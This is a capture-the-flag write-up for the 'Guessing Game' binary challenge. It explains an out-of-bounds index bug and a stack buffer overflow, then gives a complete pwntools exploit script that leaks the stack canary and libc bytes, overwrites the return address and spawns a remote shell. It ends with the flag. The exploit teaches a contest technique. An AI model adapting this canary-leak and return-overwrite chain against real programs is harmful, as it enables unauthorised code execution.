# The Guessing Game

## Challenge

The program prompts us to guess bytes from an array of 8 elements.
Incorrect guesses tell us whether we were low or high relative to the actual value.
Once we have guessed correctly 8 times, we are prompted to leave feedback.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Disassembly

```c
undefined8 dbg.main(void)
{
    int32_t iVar1;
    undefined8 uVar2;
    int64_t in_FS_OFFSET;
    uint8_t guess;
    int32_t index;
    undefined8 score;
    uint8_t nums [8];
    char feedback [24];
    int64_t canary;
    
    // int main();
    canary = *(int64_t *)(in_FS_OFFSET + 0x28);
    dbg.init();
    score._0_4_ = 0;
    for (score._4_4_ = 0; score._4_4_ < 8; score._4_4_ = score._4_4_ + 1) {
        iVar1 = sym.imp.rand();
        nums[(int32_t)score._4_4_] = (char)iVar1 + (char)(iVar1 / 0xff);
    }
    while ((int32_t)score < 8) {
        sym.imp.printf("\nWhich number are you guessing (0-7)? ");
        sym.imp.__isoc99_scanf(0x202f, &index);
        sym.imp.printf("Enter your guess: ");
        sym.imp.__isoc99_scanf(" %hhu", &guess);
        if (guess < nums[index]) {
            sym.imp.puts("Ouch, too low!");
        } else {
            if (nums[index] < guess) {
                sym.imp.puts("Too high!");
            } else {
                score._0_4_ = (int32_t)score + 1;
                sym.imp.puts("You got it!");
            }
        }
    }
    sym.imp.getchar();
    sym.imp.printf("So, what did you think of my game? ");
    sym.imp.read(0, feedback, 0x32);
    uVar2 = 0;
    if (canary != *(int64_t *)(in_FS_OFFSET + 0x28)) {
        uVar2 = sym.imp.__stack_chk_fail();
    }
    return uVar2;
}
```

## Solution

Though we are prompted to use an index of [0,7], we can guess outside this and check other stack values.

We have 8 correct guesses before we must leave feedback, and we need to leak the stack canary as well as some bytes from the libc address.

We can leak 7 bytes from the stack canary, with the last always being a null byte.
This leaves us with 1 byte for the libc address, however, this isn't enough to eliminate all guess work.

Here we have 2 options to increase the number of guesses we get.
We can leak the stack canary only, then overwrite the return address completely with the main function to give us 8 more guesses.
Alternatively, we can avoid using guesses about half the time, as there is a chance when using binary search that we can determine the value exactly without guessing it, through process of elimination.
This gives us an around 4 more guesses, which is more than enough to guess the required bytes from the libc address.

The exploit script below uses the latter approach.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 193.57.159.27 --port 59624 guess
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('guessing/guess')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '193.57.159.27'
port = int(args.PORT or 25021)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

freeleaks = 0

def leak(n):
    lowlim = 0
    highlim = 255
    global freeleaks

    while(True):

        guess = (lowlim + highlim) // 2

        if(highlim - lowlim == 2 and freeleaks == 0):
            freeleaks += 1
            return guess

        io.sendlineafter("Which number are you guessing (0-7)?", str(n))
        io.sendlineafter("Enter your guess:", str(guess))
        res = io.recvuntil("!")

        if b"low" in res:
            lowlim = guess
        elif b"high" in res:
            highlim = guess
        else:
            return guess

io = start()

canary = [
        p8(0x0),
        p8(leak(33)),
        p8(leak(34)),
        p8(leak(35)),
        p8(leak(36)),
        p8(leak(37)),
        p8(leak(38)),
        p8(leak(39)),
        ]

gadget = [
        p8(0x7e),
        p8(leak(49) - 0x70 + 0x6c),
        p8(leak(50) - 0x02 + 0x0e),
        ]

payload = flat({
    0x20-0x8: canary,
    0x20+0x8: gadget,
    })

io.sendafter("So, what did you think of my game?", payload)

io.interactive()
```

## Flag

`rarctf{4nd_th3y_s41d_gu3ss1ng_1snt_fun!!_c9cbd665}`

